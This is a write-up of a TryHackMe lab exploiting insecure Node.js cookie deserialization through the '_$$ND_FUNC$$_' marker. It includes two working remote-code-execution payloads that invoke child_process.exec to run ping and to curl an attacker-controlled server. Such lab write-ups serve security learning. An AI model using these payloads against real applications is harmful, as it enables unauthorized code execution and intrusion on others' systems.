<h1>Node.js Deserialization Vulnerability - FOR EDUCATIONAL PURPOSES ONLY</h1>

The target is a TryHackMe Lab, so we can safely test the purposefully vulnerable Node.js environment.

The Node.js application is vulnerable to insecure deserialization because attacker-controlled input supplied through the 'email' parameter is processed by a deserialization mechanism that recognizes the '_$$ND_FUNC$$_'
serialization marker and reconstructs attacker-supplied JavaScript functions. 

**By supplying a serialized function and invoking it with '()', arbitrary JavaScript can be executed within the Node.js process**

This is demonstrated by invoking Node's 'child_process.exec()' to execute operating-system commands on the vulnerable target, including **ping** and **curl**.

<img width="1718" height="847" alt="deserialization-email-parameter-1" src="https://github.com/user-attachments/assets/b4e48c59-e793-4fc9-b72e-c99f64128387" />

<img width="1887" height="467" alt="deserialization-email-parameter-2" src="https://github.com/user-attachments/assets/504df11d-7c6c-4577-9648-907732481a4c" />

<img width="1412" height="743" alt="deserialization-email-parameter-3" src="https://github.com/user-attachments/assets/dc2cd965-0ef9-4e74-ac05-d7da75159ed4" />

The application takes your input (your email) and serializes it and creates a cookie called "session". Later on, when you request the page again with your new cookie, the server unsafely deserializes the cookie object.

This allows us to inject a function and achieve remote code execution (for educational purposes only) in our lab environment.

I will prove RCE by making the vulnerable target run the ping command and the curl command. Now that I know the cookie deserialization is vulnerable, I will just inject into the cookie and send request with Burpsuite
Repeater.

**Proof Of Concept - ping**

payload:

```
_$$ND_FUNC$$_function(){require('child_process').exec('ping -c 1 my-server-ip',function(error,stdout,stderr){console.log(stdout);})}()
```

<img width="1853" height="635" alt="node-js-deserialization-rce-poc-ping-1" src="https://github.com/user-attachments/assets/3e91ec92-860c-4aad-97aa-e3d5ffccc36d" />

<img width="1372" height="188" alt="node-js-deserialization-rce-poc-ping-2" src="https://github.com/user-attachments/assets/13087fb0-d750-478a-a900-eabb94c71fe6" />


**Proof Of Concept - curl**

payload:

```
_$$ND_FUNC$$_function(){require('child_process').exec('curl http://my-server-ip:1337',function(error,stdout,stderr){console.log(stdout);})}()
```

<img width="1861" height="684" alt="node-js-deserialization-rce-poc-curl-1" src="https://github.com/user-attachments/assets/5273bf60-ddd2-4837-b31b-d6be994e14c0" />

<img width="851" height="108" alt="node-js-deserialization-rce-poc-curl-2" src="https://github.com/user-attachments/assets/3a917873-ce6e-432b-a7a4-424987228a17" />


